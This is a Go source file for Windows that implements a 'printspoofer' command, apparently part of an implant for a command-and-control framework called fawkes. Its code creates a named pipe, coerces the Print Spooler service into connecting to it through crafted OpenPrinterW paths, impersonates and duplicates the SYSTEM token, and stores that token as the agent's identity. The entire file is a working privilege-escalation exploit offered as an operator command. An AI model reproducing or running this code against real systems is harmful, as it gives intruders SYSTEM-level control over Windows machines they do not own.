//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PrintSpooferCommand implements the PrintSpoofer privilege escalation technique.
// Exploits SeImpersonatePrivilege by creating a named pipe and triggering the
// Print Spooler service (SYSTEM) to connect to it, then impersonating the token.
// Works from NETWORK SERVICE, LOCAL SERVICE, or any context with SeImpersonate.
type PrintSpooferCommand struct{}

func (c *PrintSpooferCommand) Name() string { return "printspoofer" }
func (c *PrintSpooferCommand) Description() string {
	return "PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler"
}

type printSpooferArgs struct {
	Timeout int `json:"timeout"`
}

var (
	winspoolDrv      = windows.NewLazySystemDLL("winspool.drv")
	procOpenPrinterW = winspoolDrv.NewProc("OpenPrinterW")
	procClosePrinter = winspoolDrv.NewProc("ClosePrinter")
)

func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
	var args printSpooferArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}
	if args.Timeout == 0 {
		args.Timeout = 15
	}

	// Check SeImpersonatePrivilege first
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Get computer name for the printer path.
	// The PrintSpoofer technique requires the spooler to connect via SMB auth
	// (not local pipe), so we need a hostname that triggers network-style resolution.
	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
	compNameSize := uint32(len(compNameBuf))
	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("GetComputerName failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])

	// Also get the DNS hostname (FQDN) for domain-joined machines
	var dnsNameBuf [256]uint16
	dnsNameSize := uint32(len(dnsNameBuf))
	var dnsHostname string
	if windows.GetComputerNameEx(windows.ComputerNameDnsFullyQualified, &dnsNameBuf[0], &dnsNameSize) == nil {
		dnsHostname = windows.UTF16ToString(dnsNameBuf[:dnsNameSize])
	}

	// Generate a random pipe name suffix
	var randBuf [8]byte
	windows.GetSystemTimeAsFileTime((*windows.Filetime)(unsafe.Pointer(&randBuf)))
	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])

	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
	// The spooler appends \pipe\spoolss to the server path, so we create a pipe
	// matching that pattern.
	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)

	// Create security descriptor allowing Everyone to connect
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor failed: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("UTF16 conversion failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create pipe with FILE_FLAG_OVERLAPPED for async ConnectNamedPipe
	hPipe, _, createErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipe failed for %s: %v", pipePath, createErr),
			Status:    "error",
			Completed: true,
		}
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Start async ConnectNamedPipe with OVERLAPPED
	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, non-signaled
	if eventErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(event)

	var overlapped windows.Overlapped
	overlapped.HEvent = event

	ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
	if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
			Status:    "error",
			Completed: true,
		}
	}

	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED

	// Declare outside the if block so they're available for success output.
	// All hostnames must trigger SMB authentication to get SYSTEM.
	// "localhost" is NOT included — it uses the local pipe namespace which
	// yields NETWORK SERVICE (our own process token) instead of SYSTEM.
	// Hostname priority:
	// 1. Computer name (NetBIOS) — triggers SMB auth via loopback
	// 2. DNS FQDN — triggers SMB auth via DNS resolution
	// 3. 127.0.0.1 — forces SMB over TCP loopback
	var triggerWarnings []string
	hostnames := []string{computerName}
	if dnsHostname != "" && dnsHostname != computerName {
		hostnames = append(hostnames, dnsHostname)
	}
	hostnames = append(hostnames, "127.0.0.1")

	if !alreadyConnected {
		// Trigger the Print Spooler to connect to our pipe.
		// OpenPrinterW("\\HOSTNAME/pipe/{suffix}") causes the spooler to
		// connect to \\HOSTNAME\pipe\{suffix}\pipe\spoolss = our pipe.
		// The forward slash in /pipe/ is key — it's interpreted as path separator.
		//
		// Try multiple hostname formats since some Windows builds reject certain names.
		// OpenPrinterW errors are non-fatal — the pipe connection is what matters.
		//
		// IMPORTANT: OpenPrinterW uses SyscallN which blocks the OS thread.
		// On domain-joined systems, it can block indefinitely during path resolution.
		// Each trigger runs in a separate goroutine with a 5-second timeout.
		// Build hostname list: computer name, FQDN (if available), localhost.
		// The spooler must connect via SMB authentication (not local pipe) to
		// impersonate as SYSTEM. Computer name and FQDN trigger SMB auth;
		// localhost may connect via local path and yield NETWORK SERVICE.

		// Per-trigger timeout: use half of the overall timeout (divided among triggers)
		// but at least 10s. OpenPrinterW on domain-joined machines can block during
		// name resolution, especially for NetBIOS names going through WINS/broadcast.
		perTriggerTimeout := time.Duration(args.Timeout/len(hostnames)) * time.Second
		if perTriggerTimeout < 10*time.Second {
			perTriggerTimeout = 10 * time.Second
		}
		for _, host := range hostnames {
			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
			triggerTimeout := perTriggerTimeout

			// Run trigger in goroutine — OpenPrinterW can block the OS thread
			triggerDone := make(chan error, 1)
			go func(name string) {
				triggerDone <- triggerSpooler(name)
			}(printerName)

			select {
			case triggerErr := <-triggerDone:
				if triggerErr != nil {
					triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
				}
			case <-time.After(triggerTimeout):
				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: OpenPrinterW timed out (%s)", host, triggerTimeout))
			}

			// Check if spooler connected (1s check)
			checkResult, _ := windows.WaitForSingleObject(event, 1000)
			if checkResult == windows.WAIT_OBJECT_0 {
				break // Connected!
			}
		}

		// Wait for spooler to connect (remaining timeout)
		timeoutMs := uint32(args.Timeout * 1000)
		waitResult, _ := windows.WaitForSingleObject(event, timeoutMs)
		switch waitResult {
		case windows.WAIT_OBJECT_0:
			// Connected!
		case 258: // WAIT_TIMEOUT
			windows.CancelIoEx(pipeHandle, &overlapped)
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect to %s.\n", args.Timeout, pipePath))
			sb.WriteString("Possible causes:\n")
			sb.WriteString("- Print Spooler not running (sc query spooler)\n")
			sb.WriteString("- Technique may be patched on this Windows build\n")
			sb.WriteString("- SeImpersonatePrivilege context required\n")
			if len(triggerWarnings) > 0 {
				sb.WriteString("\nTrigger diagnostics:\n")
				for _, w := range triggerWarnings {
					sb.WriteString(fmt.Sprintf("  %s\n", w))
				}
			}
			return structs.CommandResult{
				Output:    sb.String(),
				Status:    "error",
				Completed: true,
			}
		default:
			windows.CancelIoEx(pipeHandle, &overlapped)
			return structs.CommandResult{
				Output:    fmt.Sprintf("WaitForSingleObject failed: result=%d", waitResult),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Lock goroutine to OS thread for the entire impersonation sequence.
	// ImpersonateNamedPipeClient sets the token on the current OS thread,
	// and Go's scheduler can migrate goroutines between threads at any point.
	// Without LockOSThread, OpenThreadToken may run on a different thread
	// and fail with ERROR_NO_TOKEN (1008).
	runtime.LockOSThread()

	// Spooler connected — impersonate the SYSTEM token
	impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if impRet == 0 {
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v", impErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the impersonated identity
	clientIdentity, _ := GetCurrentIdentity()
	if clientIdentity == "" {
		clientIdentity = "unknown"
	}

	// Capture the thread impersonation token
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}
	if err != nil {
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to a primary token for persistent use
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(
		threadToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		err = windows.DuplicateTokenEx(
			threadToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&dupToken,
		)
	}
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		runtime.UnlockOSThread()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Clean up impersonation and pipe
	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	// Store in global identity system (calls ImpersonateLoggedOnUser on this thread)
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		runtime.UnlockOSThread()
		windows.CloseHandle(windows.Handle(dupToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Mark as thread-locked so PrepareExecution doesn't double-lock
	osThreadLocked = true

	var sb strings.Builder
	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
	sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
	sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
	if len(triggerWarnings) > 0 {
		sb.WriteString("\nTrigger diagnostics:\n")
		for _, w := range triggerWarnings {
			sb.WriteString(fmt.Sprintf("  %s\n", w))
		}
	}
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
	sb.WriteString("Use 'whoami' to verify current context.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// triggerSpooler calls OpenPrinterW with a crafted path that causes the
// Print Spooler service to connect to our named pipe as SYSTEM.
// OpenPrinterW errors are returned as diagnostics but are non-fatal —
// the spooler may have already connected to the pipe before returning.
func triggerSpooler(printerName string) error {
	namePtr, err := windows.UTF16PtrFromString(printerName)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	var hPrinter uintptr
	ret, _, callErr := procOpenPrinterW.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&hPrinter)),
		0, // pDefault = NULL
	)

	// OpenPrinterW may fail with an error (the printer doesn't actually exist),
	// but the important thing is that the spooler TRIED to connect to the pipe.
	// The authentication/connection happens before the error is returned.
	if ret != 0 && hPrinter != 0 {
		procClosePrinter.Call(hPrinter)
	}

	// Return OpenPrinterW errors as diagnostics (caller treats as non-fatal).
	// Expected errors:
	//   1801 = ERROR_INVALID_PRINTER_NAME (printer doesn't exist — expected)
	//   1210 = ERROR_INVALID_COMPUTERNAME (hostname format rejected)
	//   53   = ERROR_BAD_NETPATH (path resolution failed)
	// In all cases the spooler may still have connected to our pipe.
	if ret == 0 && callErr != nil {
		return fmt.Errorf("OpenPrinterW(%s): %v", printerName, callErr)
	}

	return nil
}
